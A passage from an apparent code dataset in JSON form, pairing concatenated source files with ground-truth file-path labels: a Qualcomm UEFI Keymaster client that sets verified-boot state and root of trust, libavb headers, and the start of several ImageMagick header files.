        "content": "'mu_andromeda_platforms/Platforms/QcomModulePkg/Library/avb/KeymasterClient.c'\n:\n#include \"KeymasterClient.h\"\n#include \"VerifiedBoot.h\"\n#include \"libavb/libavb.h\"\n#include <Library/BaseMemoryLib.h>\n#include <Library/DebugLib.h>\n#include <Library/UefiBootServicesTableLib.h>\n#include <Library/UefiRuntimeServicesTableLib.h>\n#include <Protocol/EFIQseecom.h>\n#include <Protocol/LoadedImage.h>\n#include <Protocol/scm_sip_interface.h>\n\ntypedef struct {\n  QCOM_QSEECOM_PROTOCOL *QseeComProtocol;\n  UINT32 AppId;\n} KMHandle;\n\n\n#define KEYMASTER_CMD_ID_OLD 0UL\n#define KEYMASTER_CMD_ID 0x100UL\n#define KEYMASTER_UTILS_CMD_ID 0x200UL\n#define GK_CMD_ID 0x1000UL\n\ntypedef enum {\n\n  KEYMASTER_GET_SUPPORTED_ALGORITHMS = (KEYMASTER_CMD_ID + 1UL),\n  KEYMASTER_GET_SUPPORTED_BLOCK_MODES = (KEYMASTER_CMD_ID + 2UL),\n  KEYMASTER_GET_SUPPORTED_PADDING_MODES = (KEYMASTER_CMD_ID + 3UL),\n  KEYMASTER_GET_SUPPORTED_DIGESTS = (KEYMASTER_CMD_ID + 4UL),\n  KEYMASTER_GET_SUPPORTED_IMPORT_FORMATS = (KEYMASTER_CMD_ID + 5UL),\n  KEYMASTER_GET_SUPPORTED_EXPORT_FORMATS = (KEYMASTER_CMD_ID + 6UL),\n  KEYMASTER_ADD_RNG_ENTROPY = (KEYMASTER_CMD_ID + 7UL),\n  KEYMASTER_GENERATE_KEY = (KEYMASTER_CMD_ID + 8UL),\n  KEYMASTER_GET_KEY_CHARACTERISTICS = (KEYMASTER_CMD_ID + 9UL),\n  KEYMASTER_RESCOPE = (KEYMASTER_CMD_ID + 10UL),\n  KEYMASTER_IMPORT_KEY = (KEYMASTER_CMD_ID + 11UL),\n  KEYMASTER_EXPORT_KEY = (KEYMASTER_CMD_ID + 12UL),\n  KEYMASTER_DELETE_KEY = (KEYMASTER_CMD_ID + 13UL),\n  KEYMASTER_DELETE_ALL_KEYS = (KEYMASTER_CMD_ID + 14UL),\n  KEYMASTER_BEGIN = (KEYMASTER_CMD_ID + 15UL),\n  KEYMASTER_UPDATE = (KEYMASTER_CMD_ID + 17UL),\n  KEYMASTER_FINISH = (KEYMASTER_CMD_ID + 18UL),\n  KEYMASTER_ABORT = (KEYMASTER_CMD_ID + 19UL),\n  KEYMASTER_UPGRADE = (KEYMASTER_CMD_ID + 20UL),\n  KEYMASTER_ATTEST = (KEYMASTER_CMD_ID + 21UL),\n  KEYMASTER_CONFIGURE = (KEYMASTER_CMD_ID + 22UL),\n\n  KEYMASTER_GET_VERSION = (KEYMASTER_UTILS_CMD_ID + 0UL),\n  KEYMASTER_SET_ROT = (KEYMASTER_UTILS_CMD_ID + 1UL),\n  KEYMASTER_READ_KM_DEVICE_STATE = (KEYMASTER_UTILS_CMD_ID + 2UL),\n  KEYMASTER_WRITE_KM_DEVICE_STATE = (KEYMASTER_UTILS_CMD_ID + 3UL),\n  KEYMASTER_MILESTONE_CALL = (KEYMASTER_UTILS_CMD_ID + 4UL),\n  KEYMASTER_GET_AUTH_TOKEN_KEY = (KEYMASTER_UTILS_CMD_ID + 5UL),\n  KEYMASTER_SECURE_WRITE_PROTECT = (KEYMASTER_UTILS_CMD_ID + 6UL),\n  KEYMASTER_SET_VERSION = (KEYMASTER_UTILS_CMD_ID + 7UL),\n  KEYMASTER_SET_BOOT_STATE = (KEYMASTER_UTILS_CMD_ID + 8UL),\n  KEYMASTER_PROVISION_ATTEST_KEY = (KEYMASTER_UTILS_CMD_ID + 9UL),\n  KEYMASTER_SET_VBH = (KEYMASTER_UTILS_CMD_ID + 17UL),\n  KEYMASTER_GET_DATE_SUPPORT = (KEYMASTER_UTILS_CMD_ID + 21UL),\n\n  KEYMASTER_LAST_CMD_ENTRY = (int)0xFFFFFFFFULL\n} KeyMasterCmd;\n\ntypedef enum {\n  KM_ERROR_INVALID_TAG = -40,\n} KeyMasterError;\n\ntypedef struct {\n  UINT32 CmdId;\n  UINT32 RotOffset;\n  UINT32 RotSize;\n  CHAR8 RotDigest[AVB_SHA256_DIGEST_SIZE];\n} __attribute__ ((packed)) KMSetRotReq;\n\ntypedef struct {\n  INT32 Status;\n} __attribute__ ((packed)) KMSetRotRsp;\n\ntypedef struct {\n  UINT32 IsUnlocked;\n  CHAR8 PublicKey[AVB_SHA256_DIGEST_SIZE];\n  UINT32 Color;\n  UINT32 SystemVersion;\n  UINT32 SystemSecurityLevel;\n} __attribute__ ((packed)) KMBootState;\n\ntypedef struct {\n  UINT32 CmdId;\n  UINT32 Version;\n  UINT32 Offset;\n  UINT32 Size;\n  KMBootState BootState;\n} __attribute__ ((packed)) KMSetBootStateReq;\n\ntypedef struct {\n  INT32 Status;\n} __attribute__ ((packed)) KMSetBootStateRsp;\n\ntypedef struct {\n  UINT32 CmdId;\n} __attribute__ ((packed)) KMGetVersionReq;\n\ntypedef struct {\n  INT32 Status;\n  UINT32 Major;\n  UINT32 Minor;\n  UINT32 AppMajor;\n  UINT32 AppMinor;\n} __attribute__ ((packed)) KMGetVersionRsp;\n\ntypedef struct\n{\n  UINT32 CmdId;\n  CHAR8 Vbh[AVB_SHA256_DIGEST_SIZE];\n} __attribute__ ((packed)) KMSetVbhReq;\n\ntypedef struct\n{\n  INT32 Status;\n} __attribute__ ((packed)) KMSetVbhRsp;\n\ntypedef struct {\n  UINT32 CmdId;\n} __attribute__ ((packed)) KMGetDateSupportReq;\n\ntypedef struct {\n  INT32 Status;\n} __attribute__ ((packed)) KMGetDateSupportRsp;\n\nEFI_STATUS\nKeyMasterStartApp (KMHandle *Handle)\n{\n  EFI_STATUS Status = EFI_SUCCESS;\n  KMGetVersionReq Req = {0};\n  KMGetVersionRsp Rsp = {0};\n\n  if (Handle == NULL) {\n    DEBUG ((EFI_D_ERROR, \"KeyMasterStartApp: Invalid Handle\\n\"));\n    return EFI_INVALID_PARAMETER;\n  }\n\n  Status = gBS->LocateProtocol (&gQcomQseecomProtocolGuid, NULL,\n                                (VOID **)&(Handle->QseeComProtocol));\n  if (Status != EFI_SUCCESS) {\n    DEBUG ((EFI_D_ERROR, \"Unable to locate QSEECom protocol: %r\\n\", Status));\n    return Status;\n  }\n\n  Status = Handle->QseeComProtocol->QseecomStartApp (\n      Handle->QseeComProtocol, \"keymaster\", &(Handle->AppId));\n  if (Status != EFI_SUCCESS) {\n    DEBUG ((EFI_D_ERROR,\n            \"KeyMasterStartApp: QseecomStartApp failed status: %r\\n\", Status));\n    return Status;\n  }\n\n  DEBUG ((EFI_D_VERBOSE, \"keymaster app id %d\\n\", Handle->AppId));\n\n  Req.CmdId = KEYMASTER_GET_VERSION;\n  Status = Handle->QseeComProtocol->QseecomSendCmd (\n      Handle->QseeComProtocol, Handle->AppId, (UINT8 *)&Req, sizeof (Req),\n      (UINT8 *)&Rsp, sizeof (Rsp));\n  if (Status != EFI_SUCCESS || Rsp.Status != 0 || Rsp.Major < 2) {\n    DEBUG ((EFI_D_ERROR, \"KeyMasterStartApp: Get Version err, status: \"\n                         \"%d, response status: %d, Major: %d\\n\",\n            Status, Rsp.Status, Rsp.Major));\n    return EFI_LOAD_ERROR;\n  }\n  DEBUG ((EFI_D_VERBOSE, \"KeyMasterStartApp success AppId: 0x%x, Major: %d\\n\",\n          Handle->AppId, Rsp.Major));\n  return Status;\n}\n\nEFI_STATUS\nKeyMasterSetRotAndBootState (KMRotAndBootState *BootState)\n{\n  EFI_STATUS Status = EFI_SUCCESS;\n  CHAR8 *RotDigest = NULL;\n  CHAR8 *BootStateDigest = NULL;\n  CHAR8 BootStateOrgangeDigest[AVB_SHA256_DIGEST_SIZE] = {0};\n  AvbSHA256Ctx RotCtx;\n  AvbSHA256Ctx BootStateCtx;\n  KMHandle Handle = {NULL};\n  KMSetRotReq RotReq = {0};\n  KMSetRotRsp RotRsp = {0};\n  KMSetBootStateReq BootStateReq = {0};\n  KMSetBootStateRsp BootStateRsp = {0};\n  BOOLEAN secure_device = FALSE;\n\n  if (BootState == NULL) {\n    DEBUG ((EFI_D_ERROR, \"Invalid parameter BootState\\n\"));\n    return EFI_INVALID_PARAMETER;\n  }\n\n\n  avb_sha256_init (&RotCtx);\n\n  switch (BootState->Color) {\n  case GREEN:\n  case YELLOW:\n    avb_sha256_update (&RotCtx, (const uint8_t *)BootState->PublicKey,\n                       BootState->PublicKeyLength);\n    avb_sha256_update (&RotCtx, (const uint8_t *)&BootState->IsUnlocked,\n                       sizeof (BootState->IsUnlocked));\n    break;\n  case ORANGE:\n    avb_sha256_update (&RotCtx, (const uint8_t *)&BootState->IsUnlocked,\n                       sizeof (BootState->IsUnlocked));\n    break;\n  case RED:\n  default:\n    DEBUG ((EFI_D_ERROR, \"Invalid state to boot!\\n\"));\n    return EFI_LOAD_ERROR;\n  }\n\n  RotDigest = (CHAR8 *)avb_sha256_final (&RotCtx);\n\n\n  switch (BootState->Color) {\n  case GREEN:\n  case YELLOW:\n    avb_sha256_init (&BootStateCtx);\n    avb_sha256_update (&BootStateCtx, (const uint8_t *)BootState->PublicKey,\n                       BootState->PublicKeyLength);\n\n    BootStateDigest = (CHAR8 *)avb_sha256_final (&BootStateCtx);\n    break;\n  case ORANGE:\n    BootStateDigest = BootStateOrgangeDigest;\n    break;\n  case RED:\n  default:\n    DEBUG ((EFI_D_ERROR, \"Invalid state to boot!\\n\"));\n    return EFI_LOAD_ERROR;\n  }\n\n\n  GUARD (KeyMasterStartApp (&Handle));\n\n\n  RotReq.CmdId = KEYMASTER_SET_ROT;\n  RotReq.RotOffset = (UINT8 *)&RotReq.RotDigest - (UINT8 *)&RotReq;\n  RotReq.RotSize = sizeof (RotReq.RotDigest);\n  CopyMem (RotReq.RotDigest, RotDigest, AVB_SHA256_DIGEST_SIZE);\n\n  Status = Handle.QseeComProtocol->QseecomSendCmd (\n      Handle.QseeComProtocol, Handle.AppId, (UINT8 *)&RotReq, sizeof (RotReq),\n      (UINT8 *)&RotRsp, sizeof (RotRsp));\n  if (Status != EFI_SUCCESS || RotRsp.Status != 0) {\n    DEBUG ((EFI_D_ERROR, \"KeyMasterSendRotAndBootState: Set ROT err, \"\n                         \"Status: %r, response status: %d\\n\",\n            Status, RotRsp.Status));\n    return EFI_LOAD_ERROR;\n  }\n\n\n  BootStateReq.CmdId = KEYMASTER_SET_BOOT_STATE;\n  BootStateReq.Version = 0;\n  BootStateReq.Size = sizeof (BootStateReq.BootState);\n  BootStateReq.Offset =\n      (UINT8 *)&BootStateReq.BootState - (UINT8 *)&BootStateReq;\n  BootStateReq.BootState.Color = BootState->Color;\n  BootStateReq.BootState.IsUnlocked = BootState->IsUnlocked;\n  BootStateReq.BootState.SystemSecurityLevel = BootState->SystemSecurityLevel;\n  BootStateReq.BootState.SystemVersion = BootState->SystemVersion;\n  CopyMem (BootStateReq.BootState.PublicKey, BootStateDigest,\n           AVB_SHA256_DIGEST_SIZE);\n\n  Status = Handle.QseeComProtocol->QseecomSendCmd (\n      Handle.QseeComProtocol, Handle.AppId, (UINT8 *)&BootStateReq,\n      sizeof (BootStateReq), (UINT8 *)&BootStateRsp, sizeof (BootStateRsp));\n  if (Status != EFI_SUCCESS || BootStateRsp.Status != 0) {\n    DEBUG ((EFI_D_ERROR, \"KeyMasterSendRotAndBootState: Set BootState err, \"\n                         \"Status: %r, response status: %d\\n\",\n            Status, BootStateRsp.Status));\n    return EFI_LOAD_ERROR;\n  }\n\n\n  if (((Status = IsSecureDevice (&secure_device)) == EFI_SUCCESS) &&\n      secure_device && (BootState->Color != GREEN)) {\n    if (AllowSetFuse ()) {\n      Status = SetFuse (TZ_HLOS_IMG_TAMPER_FUSE);\n      if (Status != EFI_SUCCESS) {\n        DEBUG ((EFI_D_ERROR, \"KeyMasterSetRotAndBootState: \"\n                             \"SetFuse (TZ_HLOS_IMG_TAMPER_FUSE) fails!\\n\"));\n        return Status;\n      }\n      Status = SetFuse (TZ_HLOS_TAMPER_NOTIFY_FUSE);\n      if (Status != EFI_SUCCESS) {\n        DEBUG ((EFI_D_ERROR, \"KeyMasterSetRotAndBootState: \"\n                             \"SetFuse (TZ_HLOS_TAMPER_NOTIFY_FUSE) fails!\\n\"));\n        return Status;\n      }\n    }\n  }\n  DEBUG ((EFI_D_VERBOSE, \"KeyMasterSetRotAndBootState success\\n\"));\n  return Status;\n}\n\nEFI_STATUS\nSetVerifiedBootHash (CONST CHAR8 *Vbh, UINTN VbhSize)\n{\n  EFI_STATUS Status = EFI_SUCCESS;\n  KMSetVbhReq VbhReq = {0};\n  KMSetVbhRsp VbhRsp = {0};\n  KMHandle Handle = {NULL};\n\n  if (!Vbh ||\n      VbhSize != sizeof (VbhReq.Vbh)) {\n    DEBUG ((EFI_D_ERROR, \"Vbh input params invalid\\n\"));\n    return EFI_INVALID_PARAMETER;\n  }\n\n\n  GUARD (KeyMasterStartApp (&Handle));\n  VbhReq.CmdId = KEYMASTER_SET_VBH;\n  CopyMem (VbhReq.Vbh, Vbh, VbhSize);\n\n  Status = Handle.QseeComProtocol->QseecomSendCmd (\n      Handle.QseeComProtocol, Handle.AppId, (UINT8 *)&VbhReq,\n      sizeof (VbhReq), (UINT8 *)&VbhRsp, sizeof (VbhRsp));\n  if (Status != EFI_SUCCESS ||\n                VbhRsp.Status != 0) {\n    DEBUG ((EFI_D_ERROR, \"Set Vbh Error, \"\n                         \"Status: %r, response status: %d\\n\",\n            Status, VbhRsp.Status));\n    if (Status == EFI_SUCCESS &&\n                VbhRsp.Status == KM_ERROR_INVALID_TAG) {\n      DEBUG ((EFI_D_ERROR, \"VBH not supported in keymaster\\n\"));\n      return EFI_SUCCESS;\n    }\n    return EFI_LOAD_ERROR;\n  }\n  return EFI_SUCCESS;\n}\n\nEFI_STATUS\nKeyMasterGetDateSupport (BOOLEAN *Supported)\n{\n  EFI_STATUS Status = EFI_SUCCESS;\n  KMGetDateSupportReq Req = {0};\n  KMGetDateSupportRsp Rsp = {0};\n  KMHandle Handle = {NULL};\n\n  GUARD (KeyMasterStartApp (&Handle));\n  Req.CmdId = KEYMASTER_GET_DATE_SUPPORT;\n  Status = Handle.QseeComProtocol->QseecomSendCmd (\n      Handle.QseeComProtocol, Handle.AppId, (UINT8 *)&Req, sizeof (Req),\n      (UINT8 *)&Rsp, sizeof (Rsp));\n  if (Status != EFI_SUCCESS ||\n                Rsp.Status != 0 ) {\n    DEBUG ((EFI_D_ERROR, \"Keymaster: Get date support error, status: \"\n                         \"%d, response status: %d\\n\",\n            Status, Rsp.Status));\n    if (Status == EFI_SUCCESS &&\n                Rsp.Status == KM_ERROR_INVALID_TAG) {\n      DEBUG ((EFI_D_ERROR, \"Date in patch level not supported in keymaster\\n\"));\n      *Supported = FALSE;\n      return EFI_SUCCESS;\n    }\n    return EFI_LOAD_ERROR;\n  }\n\n  *Supported = TRUE;\n  return Status;\n}\n\n'mu_andromeda_platforms/Platforms/QcomModulePkg/Library/avb/libavb/libavb.h'\n:\n\n#ifndef LIBAVB_H_\n#define LIBAVB_H_\n\n\n\n#define AVB_INSIDE_LIBAVB_H\n#include \"avb_chain_partition_descriptor.h\"\n#include \"avb_crypto.h\"\n#include \"avb_descriptor.h\"\n#include \"avb_footer.h\"\n#include \"avb_hash_descriptor.h\"\n#include \"avb_hashtree_descriptor.h\"\n#include \"avb_kernel_cmdline_descriptor.h\"\n#include \"avb_ops.h\"\n#include \"avb_property_descriptor.h\"\n#include \"avb_sha.h\"\n#include \"avb_slot_verify.h\"\n#include \"avb_sysdeps.h\"\n#include \"avb_util.h\"\n#include \"avb_vbmeta_image.h\"\n#include \"avb_version.h\"\n#undef AVB_INSIDE_LIBAVB_H\n\n#endif\n\n'mu_andromeda_platforms/Platforms/QcomModulePkg/Library/avb/libavb/avb_crypto.h'\n:\n\n#if !defined(AVB_INSIDE_LIBAVB_H) && !defined(AVB_COMPILATION)\n#error \"Never include this file directly, include libavb.h instead.\"\n#endif\n\n#ifndef AVB_CRYPTO_H_\n#define AVB_CRYPTO_H_\n\n#include \"avb_sysdeps.h\"\n\n#ifdef __cplusplus\nextern \"C\" {\n#endif\n\n\n#define AVB_RSA2048_NUM_BYTES 256\n\n\n#define AVB_RSA4096_NUM_BYTES 512\n\n\n#define AVB_RSA8192_NUM_BYTES 1024\n\n\n#define AVB_SHA256_DIGEST_SIZE 32\n\n\n#define AVB_SHA512_DIGEST_SIZE 64\n\n\ntypedef enum {\n  AVB_ALGORITHM_TYPE_NONE,\n  AVB_ALGORITHM_TYPE_SHA256_RSA2048,\n  AVB_ALGORITHM_TYPE_SHA256_RSA4096,\n  AVB_ALGORITHM_TYPE_SHA256_RSA8192,\n  AVB_ALGORITHM_TYPE_SHA512_RSA2048,\n  AVB_ALGORITHM_TYPE_SHA512_RSA4096,\n  AVB_ALGORITHM_TYPE_SHA512_RSA8192,\n  _AVB_ALGORITHM_NUM_TYPES\n} AvbAlgorithmType;\n\n\ntypedef struct {\n  const uint8_t* padding;\n  size_t padding_len;\n  size_t hash_len;\n} AvbAlgorithmData;\n\n\nconst AvbAlgorithmData* avb_get_algorithm_data(AvbAlgorithmType algorithm)\n    AVB_ATTR_WARN_UNUSED_RESULT;\n\n\ntypedef struct AvbRSAPublicKeyHeader {\n  uint32_t key_num_bits;\n  uint32_t n0inv;\n} AVB_ATTR_PACKED AvbRSAPublicKeyHeader;\n\n\nbool avb_rsa_public_key_header_validate_and_byteswap(\n    const AvbRSAPublicKeyHeader* src,\n    AvbRSAPublicKeyHeader* dest) AVB_ATTR_WARN_UNUSED_RESULT;\n\n#ifdef __cplusplus\n}\n#endif\n\n#endif\n",
        "gt": [
            "'mu_andromeda_platforms/Platforms/QcomModulePkg/Library/avb/libavb/avb_crypto.h'",
            "'mu_andromeda_platforms/Platforms/QcomModulePkg/Library/avb/libavb/libavb.h'",
            "'mu_andromeda_platforms/Platforms/QcomModulePkg/Library/avb/KeymasterClient.c'"
        ]
    },
    {
        "files": [
            "'canvas/_include/wand/deprecate.h'",
            "'canvas/_include/wand/MagickWand.h'",
            "'canvas/_include/magick/MagickCore.h'",
            "'canvas/_include/magick/attribute.h'",
            "'canvas/_include/wand/magick-wand.h'",
            "'canvas/_include/wand/pixel-iterator.h'"
        ],
        "content": "'canvas/_include/wand/deprecate.h'\n:\n#ifndef _MAGICKWAND_DEPRECATE_H\n#define _MAGICKWAND_DEPRECATE_H\n\n#if defined(__cplusplus) || defined(c_plusplus)\nextern \"C\" {\n#endif\n\n#if !defined(MAGICKCORE_EXCLUDE_DEPRECATED)\n\n#include \"wand/drawing-wand.h\"\n#include \"wand/magick-wand.h\"\n#include \"wand/pixel-iterator.h\"\n#include \"wand/pixel-wand.h\"\n\ntypedef struct _DrawingWand\n  *DrawContext;\n\ntypedef struct _PixelView\n  PixelView;\n\ntypedef MagickBooleanType\n  (*DuplexTransferPixelViewMethod)(const PixelView *,const PixelView *,\n    PixelView *,void *),\n  (*GetPixelViewMethod)(const PixelView *,void *),\n  (*SetPixelViewMethod)(PixelView *,void *),\n  (*TransferPixelViewMethod)(const PixelView *,PixelView *,void *),\n  (*UpdatePixelViewMethod)(PixelView *,void *);\n\nextern WandExport char\n  *GetPixelViewException(const PixelView *,ExceptionType *)\n    magick_attribute((deprecated));\n\nextern WandExport double\n  DrawGetFillAlpha(const DrawingWand *) magick_attribute((deprecated)),\n  DrawGetStrokeAlpha(const DrawingWand *) magick_attribute((deprecated));\n\nextern WandExport DrawInfo\n  *DrawPeekGraphicWand(const DrawingWand *) magick_attribute((deprecated));\n\nextern WandExport char\n  *MagickDescribeImage(MagickWand *) magick_attribute((deprecated)),\n  *MagickGetImageAttribute(MagickWand *,const char *)\n    magick_attribute((deprecated)),\n  *PixelIteratorGetException(const PixelIterator *,ExceptionType *)\n    magick_attribute((deprecated));\n\nextern WandExport ssize_t\n  MagickGetImageIndex(MagickWand *) magick_attribute((deprecated));\n\nextern WandExport MagickBooleanType\n  DuplexTransferPixelViewIterator(PixelView *,PixelView *,PixelView *,\n    DuplexTransferPixelViewMethod,void *) magick_attribute((deprecated)),\n  GetPixelViewIterator(PixelView *,GetPixelViewMethod,void *)\n    magick_attribute((deprecated)),\n  IsPixelView(const PixelView *) magick_attribute((deprecated)),\n  MagickClipPathImage(MagickWand *,const char *,const MagickBooleanType)\n    magick_attribute((deprecated)),\n  MagickColorFloodfillImage(MagickWand *,const PixelWand *,const double,\n    const PixelWand *,const ssize_t,const ssize_t)\n    magick_attribute((deprecated)),\n  MagickGetImageChannelExtrema(MagickWand *,const ChannelType,size_t *,\n    size_t *) magick_attribute((deprecated)),\n  MagickGetImageExtrema(MagickWand *,size_t *,size_t *)\n    magick_attribute((deprecated)),\n  MagickGetImageMatte(MagickWand *) magick_attribute((deprecated)),\n  MagickGetImagePixels(MagickWand *,const ssize_t,const ssize_t,const size_t,\n    const size_t,const char *,const StorageType,void *)\n    magick_attribute((deprecated)),\n  MagickMapImage(MagickWand *,const MagickWand *,const MagickBooleanType)\n    magick_attribute((deprecated)),\n  MagickMatteFloodfillImage(MagickWand *,const double,const double,\n    const PixelWand *,const ssize_t,const ssize_t)\n    magick_attribute((deprecated)),\n  MagickMedianFilterImage(MagickWand *,const double)\n    magick_attribute((deprecated)),\n  MagickModeImage(MagickWand *,const double) magick_attribute((deprecated)),\n  MagickReduceNoiseImage(MagickWand *,const double)\n    magick_attribute((deprecated)),\n  MagickRemapImage(MagickWand *,const MagickWand *,const DitherMethod),\n  MagickOpaqueImage(MagickWand *,const PixelWand *,const PixelWand *,\n    const double) magick_attribute((deprecated)),\n  MagickPaintFloodfillImage(MagickWand *,const ChannelType,const PixelWand *,\n    const double,const PixelWand *,const ssize_t,const ssize_t)\n    magick_attribute((deprecated)),\n  MagickPaintOpaqueImage(MagickWand *,const PixelWand *,const PixelWand *,\n    const double) magick_attribute((deprecated)),\n  MagickPaintOpaqueImageChannel(MagickWand *,const ChannelType,\n    const PixelWand *,const PixelWand *,const double)\n    magick_attribute((deprecated)),\n  MagickPaintTransparentImage(MagickWand *,const PixelWand *,const double,\n    const double) magick_attribute((deprecated)),\n  MagickRecolorImage(MagickWand *,const size_t,const double *)\n    magick_attribute((deprecated)),\n  MagickSetImageAttribute(MagickWand *,const char *,const char *)\n    magick_attribute((deprecated)),\n  MagickSetImageIndex(MagickWand *,const ssize_t)\n    magick_attribute((deprecated)),\n  MagickSetImageOption(MagickWand *,const char *,const char *,const char *)\n    magick_attribute((deprecated)),\n  MagickSetImagePixels(MagickWand *,const ssize_t,const ssize_t,const size_t,\n    const size_t,const char *,const StorageType,const void *)\n    magick_attribute((deprecated)),\n  MagickTransparentImage(MagickWand *,const PixelWand *,const double,\n    const double) magick_attribute((deprecated)),\n  SetPixelViewIterator(PixelView *,SetPixelViewMethod,void *)\n    magick_attribute((deprecated)),\n  TransferPixelViewIterator(PixelView *,PixelView *,TransferPixelViewMethod,\n    void *) magick_attribute((deprecated)),\n  UpdatePixelViewIterator(PixelView *,UpdatePixelViewMethod,void *)\n    magick_attribute((deprecated));\n\nextern WandExport MagickWand\n  *GetPixelViewWand(const PixelView *) magick_attribute((deprecated)),\n  *MagickAverageImages(MagickWand *) magick_attribute((deprecated)),\n  *MagickFlattenImages(MagickWand *) magick_attribute((deprecated)),\n  *MagickMaximumImages(MagickWand *) magick_attribute((deprecated)),\n  *MagickMinimumImages(MagickWand *) magick_attribute((deprecated)),\n  *MagickMosaicImages(MagickWand *) magick_attribute((deprecated)),\n  *MagickRegionOfInterestImage(MagickWand *,const size_t,const size_t,\n    const ssize_t,const ssize_t) magick_attribute((deprecated));\n\nextern WandExport MagickSizeType\n  MagickGetImageSize(MagickWand *) magick_attribute((deprecated));\n\nextern WandExport PixelView\n  *ClonePixelView(const PixelView *) magick_attribute((deprecated)),\n  *DestroyPixelView(PixelView *) magick_attribute((deprecated)),\n  *NewPixelView(MagickWand *) magick_attribute((deprecated)),\n  *NewPixelViewRegion(MagickWand *,const ssize_t,const ssize_t,const size_t,\n    const size_t) magick_attribute((deprecated));\n\nextern WandExport PixelWand\n  **GetPixelViewPixels(const PixelView *) magick_attribute((deprecated)),\n  **PixelGetNextRow(PixelIterator *) magick_attribute((deprecated));\n\nextern WandExport size_t\n  GetPixelViewHeight(const PixelView *) magick_attribute((deprecated)),\n  GetPixelViewWidth(const PixelView *) magick_attribute((deprecated));\n\nextern WandExport ssize_t\n  GetPixelViewX(const PixelView *) magick_attribute((deprecated)),\n  GetPixelViewY(const PixelView *) magick_attribute((deprecated));\n\nextern WandExport unsigned char\n  *MagickWriteImageBlob(MagickWand *,size_t *) magick_attribute((deprecated));\n\nextern WandExport void\n  DrawPopGraphicContext(DrawingWand *) magick_attribute((deprecated)),\n  DrawPushGraphicContext(DrawingWand *) magick_attribute((deprecated)),\n  DrawSetFillAlpha(DrawingWand *,const double) magick_attribute((deprecated)),\n  DrawSetStrokeAlpha(DrawingWand *,const double) magick_attribute((deprecated));\n\n#endif\n\n#if defined(__cplusplus) || defined(c_plusplus)\n}\n#endif\n\n#endif\n\n'canvas/_include/wand/MagickWand.h'\n:\n\n#ifndef _MAGICK_WAND_H\n#define _MAGICK_WAND_H\n\n#if defined(__cplusplus) || defined(c_plusplus)\nextern \"C\" {\n#endif\n\n#if !defined(_MAGICKWAND_CONFIG_H)\n# define _MAGICKWAND_CONFIG_H\n# if !defined(vms) && !defined(macintosh)\n#  include \"magick/magick-config.h\"\n# else\n#  include \"magick-config.h\"\n# endif\n#if defined(_magickcore_const) && !defined(const)\n# define const _magickcore_const\n#endif\n#if defined(_magickcore_inline) && !defined(inline)\n# define inline _magickcore_inline\n#endif\n#if defined(_magickcore_restrict) && !defined(restrict)\n# define restrict  _magickcore_restrict\n#endif\n# if defined(__cplusplus) || defined(c_plusplus)\n#  undef inline\n# endif\n#endif\n\n#include <stdio.h>\n#include <stdarg.h>\n#include <stdlib.h>\n#include <sys/types.h>\n\n#if defined(WIN32) || defined(WIN64)\n#  define MAGICKCORE_WINDOWS_SUPPORT\n#else\n#  define MAGICKCORE_POSIX_SUPPORT\n#endif\n\ntypedef struct _MagickWand\n  MagickWand;\n\n#include \"wand/method-attribute.h\"\n#include \"magick/MagickCore.h\"\n#include \"wand/animate.h\"\n#include \"wand/compare.h\"\n#include \"wand/composite.h\"\n#include \"wand/conjure.h\"\n#include \"wand/convert.h\"\n#include \"wand/deprecate.h\"\n#include \"wand/display.h\"\n#include \"wand/drawing-wand.h\"\n#include \"wand/identify.h\"\n#include \"wand/import.h\"\n#include \"wand/magick-property.h\"\n#include \"wand/magick-image.h\"\n#include \"wand/mogrify.h\"\n#include \"wand/montage.h\"\n#include \"wand/pixel-iterator.h\"\n#include \"wand/pixel-wand.h\"\n#include \"wand/stream.h\"\n#include \"wand/wand-view.h\"\n\nextern WandExport char\n  *MagickGetException(const MagickWand *,ExceptionType *);\n\nextern WandExport ExceptionType\n  MagickGetExceptionType(const MagickWand *);\n\nextern WandExport MagickBooleanType\n  IsMagickWand(const MagickWand *),\n  MagickClearException(MagickWand *),\n  MagickSetIteratorIndex(MagickWand *,const ssize_t);\n\nextern WandExport MagickWand\n  *CloneMagickWand(const MagickWand *),\n  *DestroyMagickWand(MagickWand *),\n  *NewMagickWand(void),\n  *NewMagickWandFromImage(const Image *);\n\nextern WandExport ssize_t\n  MagickGetIteratorIndex(MagickWand *);\n\nextern WandExport void\n  ClearMagickWand(MagickWand *),\n  MagickWandGenesis(void),\n  MagickWandTerminus(void),\n  *MagickRelinquishMemory(void *),\n  MagickResetIterator(MagickWand *),\n  MagickSetFirstIterator(MagickWand *),\n  MagickSetLastIterator(MagickWand *);\n\n#if defined(__cplusplus) || defined(c_plusplus)\n}\n#endif\n\n#endif\n\n'canvas/_include/magick/MagickCore.h'\n:\n\n#ifndef _MAGICKCORE_CORE_H\n#define _MAGICKCORE_CORE_H\n\n#if defined(__cplusplus) || defined(c_plusplus)\nextern \"C\" {\n#endif\n\n#if !defined(_MAGICKCORE_CONFIG_H)\n# define _MAGICKCORE_CONFIG_H\n# if !defined(vms) && !defined(macintosh)\n#  include \"magick/magick-config.h\"\n# else\n#  include \"magick-config.h\"\n# endif\n#if defined(_magickcore_const) && !defined(const)\n# define const _magickcore_const\n#endif\n#if defined(_magickcore_inline) && !defined(inline)\n# define inline _magickcore_inline\n#endif\n#if defined(_magickcore_restrict) && !defined(restrict)\n# define restrict  _magickcore_restrict\n#endif\n# if defined(__cplusplus) || defined(c_plusplus)\n#  undef inline\n# endif\n#endif\n\n#include <stdio.h>\n#include <stdarg.h>\n#include <stdlib.h>\n#include <sys/types.h>\n\n#if defined(WIN32) || defined(WIN64)\n#  define MAGICKCORE_WINDOWS_SUPPORT\n#else\n#  define MAGICKCORE_POSIX_SUPPORT\n#endif\n\n#include \"magick/method-attribute.h\"\n\n#if defined(MAGICKCORE_NAMESPACE_PREFIX)\n# include \"magick/methods.h\"\n#endif\n#include \"magick/magick-type.h\"\n#include \"magick/accelerate.h\"\n#include \"magick/animate.h\"\n#include \"magick/annotate.h\"\n#include \"magick/artifact.h\"\n#include \"magick/attribute.h\"\n#include \"magick/blob.h\"\n#include \"magick/cache.h\"\n#include \"magick/cache-view.h\"\n#include \"magick/cipher.h\"\n#include \"magick/client.h\"\n#include \"magick/coder.h\"\n#include \"magick/color.h\"\n#include \"magick/colorspace.h\"\n#include \"magick/colormap.h\"\n#include \"magick/compare.h\"\n#include \"magick/composite.h\"\n#include \"magick/compress.h\"\n#include \"magick/configure.h\"\n#include \"magick/constitute.h\"\n#include \"magick/decorate.h\"\n#include \"magick/delegate.h\"\n#include \"magick/deprecate.h\"\n#include 